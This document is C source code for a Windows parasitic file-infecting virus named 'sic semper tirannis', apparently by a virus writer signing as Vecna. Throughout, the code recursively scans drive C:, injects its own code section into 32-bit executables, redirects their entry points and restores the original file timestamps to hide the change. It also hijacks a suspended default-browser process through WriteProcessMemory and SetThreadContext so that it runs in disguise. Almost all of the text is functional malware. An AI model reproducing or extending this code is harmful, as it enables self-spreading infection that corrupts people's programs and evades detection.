   //sic semper tirannis
   //(c) Vecna
   //
   //parasitic c virus, 7200 bytes long. run under the default browser context.
   //background scanning. use GetModuleHandle/LoadLibrary and GetProcAddress from
   //host IAT.

   #include <windows.h>
   #include <winsock.h>
   #include "mz.h"
   #include "pe.h"

   #include "vir.h"

   #define WORKSIZE 0x4000
   #define CODE_SIZE 0x3000-1

   #ifndef MUTANT_QUERY_STATE
   #define MUTANT_QUERY_STATE      0x0001
   #endif

   #include "entry.h"
   #include "stub.h"

   const char name[]="sic semper tirannis\n";

   char *exe_mem=0;
   int exe_size=0;


   int rva2raw(char *base,int rva){
     MZ_HEADER *mz;
     PE_HEADER *pe;
     PE_OBJENTRY *objtable;
     int count;

     mz=(MZ_HEADER *)&base[0];
     pe=(PE_HEADER *)&base[mz->mz_neptr];
     objtable=(PE_OBJENTRY *)&base[mz->mz_neptr+0x18+pe->pe_ntheadersize];
     count=pe->pe_numofobjects;
     while(count--){
       if((rva>=objtable->oe_virtrva)&&(rva<(objtable->oe_virtrva+objtable->oe_virtsize)))
         return ((rva-objtable->oe_virtrva)+objtable->oe_physoffs);
       objtable++;
     }
     return 0;
   }


   #define RVA2RAW(X) &base[rva2raw(base,X)]

   int scan_iat(char *base,int *getmhnd,int *getproc){
     MZ_HEADER *mz;
     PE_HEADER *pe;
     PE_IMPORT *iat;
     int *names;
     int pointers;

     *getmhnd=0;
     *getproc=0;
     mz=(MZ_HEADER *)&base[0];
     pe=(PE_HEADER *)&base[mz->mz_neptr];
     iat=(PE_IMPORT *)RVA2RAW(pe->pe_importrva);
     while(iat->im_name){
       if((!lstrcmpi(RVA2RAW(iat->im_name),"KERNEL32"))||(!lstrcmpi(RVA2RAW(iat->im_name),"KERNEL32.DLL"))){
         names=(int *)(iat->im_lookup?RVA2RAW(iat->im_lookup):RVA2RAW(iat->im_addresstable));
         pointers=iat->im_addresstable+pe->pe_imagebase;
         while(*names){
           if(!(lstrcmp(RVA2RAW(*names)+2,"GetModuleHandleA"))||(!(lstrcmp(RVA2RAW(*names)+2,"LoadLibraryA"))))*getmhnd=pointers;
           if(!(lstrcmp(RVA2RAW(*names)+2,"GetProcAddress")))*getproc=pointers;
           pointers+=4;
           names++;
         }
       }
       iat++;
     }
     return (*getmhnd&&*getproc);
   }


   #define ALIGN(X,Y) ((X+(Y-1))&(~(Y-1)))
   #define MARK       'SST'

   void infect(char *fname){
     MZ_HEADER *mz;
     PE_HEADER *pe;
     PE_OBJENTRY *objtable,*lastobj,*newobj;
     HANDLE hnd,hnd2;
     FILETIME tcreated,taccessed,twritten;
     int sze,aux,attr;
     char *base;

     attr=GetFileAttributes(fname);
     if(SetFileAttributes(fname,FILE_ATTRIBUTE_NORMAL)){
       if((int)(hnd=CreateFile(fname,GENERIC_READ+GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0))!=-1){
         GetFileTime(hnd,&tcreated,&taccessed,&twritten);
         sze=GetFileSize(hnd,0);
         if(hnd2=CreateFileMapping(hnd,0,PAGE_READWRITE,0,sze+WORKSIZE,0)){
           if(base=MapViewOfFile(hnd2,FILE_MAP_ALL_ACCESS,0,0,0)){
             mz=(MZ_HEADER *)&base[0];
             if((mz->mz_id=='MZ')&&(mz->mz_neptr<sze)){
               pe=(PE_HEADER *)&base[mz->mz_neptr];
               if((pe->pe_id=='PE\x00\x00')&&(pe->pe_checksum!=MARK)&&pe->pe_entrypointrva){
                 if((pe->pe_flags&IMAGE_FILE_EXECUTABLE_IMAGE)&&(pe->pe_flags&IMAGE_FILE_32BIT_MACHINE)&&(!(pe->pe_flags&IMAGE_FILE_DLL))&&(!(pe->pe_flags&IMAGE_FILE_SYSTEM))){
                   if(scan_iat(base,exe_mem+ENTRY_PTR+ENTRY_GETMHND,exe_mem+ENTRY_PTR+ENTRY_GETPROCA)){
                     *((int *)(exe_mem+ENTRY_PTR+ENTRY_EPOINT))=pe->pe_entrypointrva+pe->pe_imagebase;
                     objtable=(PE_OBJENTRY *)&base[mz->mz_neptr+0x18+pe->pe_ntheadersize];
                     lastobj=&objtable[pe->pe_numofobjects-1];
                     newobj=&objtable[pe->pe_numofobjects++];
                     strcpy((char *)&newobj->oe_name,"SST");
                     newobj->oe_virtrva=ALIGN(lastobj->oe_virtsize+lastobj->oe_virtrva,pe->pe_objectalign);
                     newobj->oe_physoffs=ALIGN(lastobj->oe_physsize+lastobj->oe_physoffs,pe->pe_filealign);
                     newobj->oe_virtsize=ALIGN(exe_size,pe->pe_objectalign);
                     newobj->oe_physsize=ALIGN(exe_size,pe->pe_filealign);
                     newobj->oe_objectflags=IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_READ;
                     pe->pe_sizeofcode+=newobj->oe_virtsize;
                     pe->pe_imagesize=newobj->oe_virtrva+newobj->oe_virtsize;
                     sze=newobj->oe_physoffs+newobj->oe_physsize;
                     pe->pe_entrypointrva=newobj->oe_virtrva+ENTRY_PTR;
                     for(aux=0;aux<=exe_size;aux++)base[newobj->oe_physoffs+aux]=exe_mem[aux];
                     pe->pe_checksum=MARK;
                   }
                 }
               }
             }
             UnmapViewOfFile(base);
           }
           CloseHandle(hnd2);
         }
         SetFilePointer(hnd,sze,0,FILE_BEGIN);
         SetEndOfFile(hnd);
         SetFileTime(hnd,&tcreated,&taccessed,&twritten);
         CloseHandle(hnd);
       }
       SetFileAttributes(fname,attr);
     }
   }


   void folder_search(){
     WIN32_FIND_DATA finddata;
     HANDLE hnd;

     if((int)(hnd=FindFirstFile("*.*",&finddata))!=-1){
       do{
         if(finddata.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY){
           if(finddata.cFileName[0]!='.'){
             SetCurrentDirectory(finddata.cFileName);
             folder_search();
             SetCurrentDirectory("..");
           }
         }else infect(finddata.cFileName);
       }while(FindNextFile(hnd,&finddata));
       FindClose(hnd);
     }
   }


   void PASCAL disk_search(int foo){
     char buffer[MAX_PATH];

     GetCurrentDirectoryA(MAX_PATH,buffer);
     SetCurrentDirectoryA("C:\\");
     folder_search();
     SetCurrentDirectoryA(buffer);
   }


   void virusmain(){
     HANDLE hnd,threads[1];
     char buffer[MAX_PATH];
     int aux;

     GetSystemDirectory(buffer,MAX_PATH);
     lstrcat(buffer,"\\SST.EXE");
     if((int)(hnd=CreateFile(buffer,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0))!=-1){
       if(exe_mem=GlobalAlloc(GPTR,exe_size=GetFileSize(hnd,0))){
         ReadFile(hnd,exe_mem,exe_size,&aux,0);
         *((int *)(exe_mem+ENTRY_PTR+ENTRY_EXE_SIZE))=exe_size;
         threads[0]=CreateThread(0,0,&disk_search,0,0,&aux);
         WaitForMultipleObjects(1,(void *)&threads,TRUE,INFINITE);
         GlobalFree(exe_mem);
       }
       CloseHandle(hnd);
     }
     ExitProcess(0);
   }


   void main(){
     STARTUPINFO sui;
     PROCESS_INFORMATION pi;
     CONTEXT ctx;
     HANDLE hnd;
     char *entry;
     char ie_path[MAX_PATH];
     char buffer[MAX_PATH];
     int aux,aux2,sz,c,hacked;

     hacked=0;
     if(!RegOpenKeyEx(HKEY_CLASSES_ROOT,"http\\shell\\open\\command",0,KEY_READ,&hnd)){
       sz=MAX_PATH;
       RegQueryValueEx(hnd,0,0,0,&buffer,&sz);
       RegCloseKey(hnd);
       for(aux=0,aux2=0,c=0;sz;sz--,aux++){
         if(buffer[aux]!='"')ie_path[aux2++]=buffer[aux];
           else c++;
         if(c==2){
           ie_path[aux2]=0;
           break;
         }
       }
       if((int)(hnd=CreateFile(ie_path,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0))!=-1){
         SetFilePointer(hnd,0x3c,0,0);
         ReadFile(hnd,&entry,4,&aux,0);
         SetFilePointer(hnd,(int)entry+0x34,0,0);
         ReadFile(hnd,&aux2,4,&aux,0);
         SetFilePointer(hnd,(int)entry+0x28,0,0);
         ReadFile(hnd,&entry,4,&aux,0);
         entry+=aux2;
         CloseHandle(hnd);
         aux=(int)GetProcAddress(GetModuleHandle("KERNEL32.DLL"),"CreateMutexA");
         *((int *)((char *)stub+STUB_API_PTR))=aux;
         aux=(int)GetProcAddress(GetModuleHandle("KERNEL32.DLL"),"LoadLibraryA");
         *((int *)((char *)stub+STUB_API2_PTR))=aux;
         memset(&sui,0,sizeof(STARTUPINFO));
         sui.cb=sizeof(STARTUPINFO);
         if(CreateProcess(ie_path,0,0,0,0,CREATE_SUSPENDED,0,0,&sui,&pi)){
           if(hnd=OpenProcess(PROCESS_ALL_ACCESS,0,pi.dwProcessId)){
             WriteProcessMemory(hnd,entry,&stub,sizeof(stub),&aux);
             ResumeThread(pi.hThread);
             while(!(aux=(int)OpenMutex(STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|MUTANT_QUERY_STATE,0,name)))Sleep(100);
             SuspendThread(pi.hThread);
             ReleaseMutex((void *)aux);
             WriteProcessMemory(hnd,(void *)0x00401000,(void *)0x00401000,CODE_SIZE,&aux);
             ctx.ContextFlags=CONTEXT_FULL;
             GetThreadContext(pi.hThread,&ctx);
             ctx.Eip=(int)&virusmain;
             SetThreadContext(pi.hThread,&ctx);
             ResumeThread(pi.hThread);
             CloseHandle(hnd);
             hacked++;
           }
         }
       }
     }
     if(!hacked)virusmain();
     ExitProcess(0);
   }
